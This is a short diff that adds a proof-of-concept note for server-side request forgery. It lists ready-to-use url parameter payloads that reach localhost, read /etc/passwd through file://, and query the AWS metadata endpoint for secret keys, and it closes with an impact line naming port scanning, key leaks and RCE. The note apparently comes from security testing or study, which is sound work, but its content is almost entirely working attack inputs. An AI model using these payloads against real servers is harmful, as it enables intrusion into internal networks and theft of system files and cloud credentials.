@@ -1,0 +1,17 @@
+SSRF PoC Steps:
+1. Normal: ?url=http://example.com -> Shows example.com
+
+2. Attack - Internal Access:
+   ?url=http://127.0.0.1 
+   -> Should show localhost / internal server content
+   -> This proves server can access internal network!
+
+3. Attack - File Read:
+   ?url=file:///etc/passwd
+   -> Tries to read server file
+
+4. Attack - Cloud Metadata (AWS):
+   ?url=http://169.254.169.254/latest/meta-data/
+   -> Cloud madhe secret keys leak!
+
+Impact: Internal port scan, file read, cloud key leak, RCE
